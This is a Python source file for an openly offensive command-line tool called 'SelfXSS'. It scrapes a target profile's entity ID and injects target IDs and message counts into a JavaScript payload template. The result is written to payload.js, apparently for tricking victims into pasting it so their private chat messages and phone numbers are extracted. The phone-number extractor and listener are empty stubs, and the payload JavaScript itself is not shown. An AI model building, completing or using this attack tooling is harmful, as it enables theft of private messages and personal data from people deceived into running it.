import requests
from bs4 import BeautifulSoup
import re

from banner import print_banner
from menu import Menu


class SelfXSS:
    def __init__(self):
        self.prompt = "selfxss > "
        with open("payload/dist/main.min.js") as f:
            self.payload = f.read()

        self.messages_payload = ""
        self.menu = Menu()


    def run(self):
        print_banner()
        while True:
            user_input = self.menu.show()

            if user_input == "chat_messages":
                self.add_message_extrator()
            elif user_input == "phone_number":
                self.add_phone_number_extractor()
            elif user_input == "generate_payload":
                self.generate_payload()
            elif user_input == "listener":
                self.launch_listener()
            elif user_input == "exit":
                break

    def launch_listener(self):
        pass

    def add_message_extrator(self):
        target_url = input("What is the target URL? ")
        msg_count = input("How many messages? ")

        res = requests.get(target_url)
        soup = BeautifulSoup(res.content, "lxml")

        with open("test.html", "wb+") as f:
            f.write(res.content)

        match = re.search(r'"entity_id":"([0-9]*)"}', res.text)

        user_id = None
        if match:
            user_id = match.group(1)
        
        if self.messages_payload == "":
            self.messages_payload += "{id: '" + user_id + "', is_done: false, count: " + msg_count + "}"
        else:
            self.messages_payload += ",{id: '" + user_id + "', is_done: false, count: " + msg_count + "}"

    def add_phone_number_extractor(self):
        pass

    def generate_payload(self):
        self.payload = self.payload.replace('"MESSAGE_EXTRACTOR"', self.messages_payload)
        
        f = open("payload.js", "w+")
        f.write(self.payload)
        f.close()


if __name__ == "__main__":
    SelfXSS().run()

